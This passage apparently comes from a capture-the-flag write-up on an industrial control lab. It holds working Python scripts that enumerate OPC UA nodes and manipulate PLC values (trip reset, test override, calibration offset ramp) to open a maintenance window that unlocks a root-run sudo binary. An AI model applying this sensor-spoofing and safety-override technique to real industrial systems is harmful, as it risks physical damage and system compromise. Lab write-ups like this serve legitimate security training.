### Enumerating OPC UA Nodes:~#

I wrote a quick enumeration script to walk the node tree.

from asyncua import Client
import asyncio

async def main():
    client = Client("opc.tcp://127.0.0.1:4840/helix/")
    async with client:
        plant = client.get_node("ns=2;i=1")
        for section in await plant.get_children():
            for var in await section.get_children():
                print(var.nodeid, await var.get_browse_name())

### Understanding the Maintenance Window Logic:~#

The cracked PDF made the privilege escalation path clear. The `helix-maint-console` binary — which `operator` could run as root via sudo with no password — would only grant access if the file `/opt/helix/state/maintenance_window` contained a valid future timestamp. That file was written by the PLC itself when a maintenance window was successfully opened.

The conditions to open a maintenance window:
- Temperature must be in the range of **~295°C**
- No active trip
- `Mode=MAINTENANCE` and `TestOverride=True`

If a trip was active, the procedure was to reset it first by setting `Mode=NORMAL`, `TestOverride=False`, `CalibrationOffset=0`, then pulsing `ResetTrip=True`.

---

### Triggering the Maintenance Window:~#

I wrote a script to automate the full sequence — clear any active trip, switch to maintenance mode, then gradually ramp the calibration offset until the temperature sensor read the target value.

````python
import asyncio
from asyncua import Client

async def main():
    client = Client("opc.tcp://127.0.0.1:4840/helix/")
    async with client:
        mode        = client.get_node("ns=2;i=12")
        test_override = client.get_node("ns=2;i=13")
        calib       = client.get_node("ns=2;i=6")
        reset_trip  = client.get_node("ns=2;i=14")
        temp        = client.get_node("ns=2;i=4")
        trip_active = client.get_node("ns=2;i=10")

        # Clear any active trip first
        await calib.write_value(0.0)
        await test_override.write_value(False)
        await mode.write_value("NORMAL")
        await asyncio.sleep(3)

        for i in range(20):
            await asyncio.sleep(3)
            trip = await trip_active.read_value()
            await reset_trip.write_value(True)
            if not trip:
                break

        # Switch to maintenance mode and ramp temperature
        await mode.write_value("MAINTENANCE")
        await test_override.write_value(True)
        await asyncio.sleep(1)

        for offset in range(1, 50):
            await calib.write_value(float(offset))
            await asyncio.sleep(2)
            t    = await temp.read_value()
            trip = await trip_active.read_value()
            if trip:
                await calib.write_value(float(offset - 3))
                break
            if 295 <= t < 303:
                # Window is open — hold position for 60s
                await asyncio.sleep(60)
                break

asyncio.run(main())
````
